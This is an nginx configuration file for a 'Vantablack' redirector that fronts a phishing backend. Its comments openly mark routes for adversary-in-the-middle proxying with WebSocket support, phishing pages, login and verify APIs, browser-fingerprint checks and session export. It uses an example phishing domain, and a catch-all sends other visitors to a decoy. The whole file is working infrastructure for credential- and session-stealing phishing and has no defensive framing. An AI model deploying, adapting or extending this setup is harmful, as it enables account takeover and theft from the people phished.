# Vantablack Tier 2 Redirector Configuration
# This server sits in front of the Core and filters traffic.

upstream vantablack_core {
    server 127.0.0.1:8000; # Private IP of Core (Change in prod)
}

server {
    listen 80;
    server_name login.secure-update.com; # Example Phishing Domain

    # Security Headers
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    
    # Hide Nginx Version
    server_tokens off;

    # Smart Redirection Endpoint
    location /v5/r/ {
        proxy_pass http://vantablack_core;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # Buffer optimization for large payloads (fingerprints)
        client_max_body_size 10M;
    }

    # AiTM Proxy Endpoint
    location /v5/p/ {
        proxy_pass http://vantablack_core;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # WebSocket support for advanced AiTM
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }

    # Static Assets (Images, JS, CSS)
    location /static/ {
        proxy_pass http://vantablack_core;
    }
    
    # Phishing Pages
    location /v5/phish/ {
        proxy_pass http://vantablack_core;
    }
    
    # API Endpoints (Login, Verify)
    location /v5/auth/ {
        proxy_pass http://vantablack_core;
    }
    
    location /v5/verify_fingerprint {
        proxy_pass http://vantablack_core;
    }
    
    # Session Export (Admin/Internal use only - should be protected or not exposed on Tier 2)
    # location /v5/session/ {
    #    return 403;
    # }

    # Catch-all: Redirect to Decoy
    location / {
        return 302 https://www.google.com;
    }
}
